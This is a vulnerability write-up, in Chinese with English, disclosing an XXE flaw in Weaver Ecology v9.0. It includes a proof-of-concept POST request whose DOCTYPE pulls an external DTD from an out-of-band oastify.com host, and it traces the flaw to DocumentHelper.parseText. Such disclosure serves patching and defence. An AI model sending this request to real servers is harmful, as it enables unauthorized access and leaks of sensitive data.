# Weaver Ecology v9.0 xxe漏洞
## 官方网站：https://www.weaver.com.cn/e9/

### 漏洞poc:
```
POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
Host: xxxx
Content-length:180

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://ykmn6o5ibhzx89t6jqqwf4udc4iu6j.oastify.com">
<M><syscode>&send;</syscode></M>
```
![图片](https://github.com/unununion/unununion/assets/142591902/de594667-16b5-4519-aee5-6120c917427d)



### 漏洞成因:
远程未经授权的攻击者可以绕过现有的防护来实现XML外部实体注入，最终可能导致敏感信息泄露，进一步与其他漏洞合作可能会造成RCE等危害。

Remote unauthorized attackers can bypass existing protections to achieve XML external entity injection, which may eventually lead to the disclosure of sensitive information, and further cooperation with other vulnerabilities may cause harm such as RCE.

### 具体代码

* 1.ProcessOverRequestByXml
![图片](https://github.com/unununion/unununion/assets/142591902/a36617ca-4cbc-4533-aa63-0a9d491a6a23)

* 2.ofsTodoDataManagerNew.processOverRequestByXml
![图片](https://github.com/unununion/unununion/assets/142591902/5d8deaec-d8fa-45eb-9980-69737ed8b804)


* 3.OfsUtils.mapToXml
![图片](https://github.com/unununion/unununion/assets/142591902/2555ba53-9099-4ca8-93cd-5aa2a9f75c89)

* 4.OfsUtils.xmltoMap
![图片](https://github.com/unununion/unununion/assets/142591902/ac1bc4df-7eec-4d3c-af49-ecd43596a44c)

* 5.SecurityMethodUtil.clearEntity  just filter entity
![图片](https://github.com/unununion/unununion/assets/142591902/0ced10f2-784b-48ac-a2e6-c6b612689579)


* 6.beacuse of DocumentHelper.parseText
  
DocumentHelper.parseText(PARAM). <strong>Vul is here.</strong> this XML entity defenses are not configured correctly
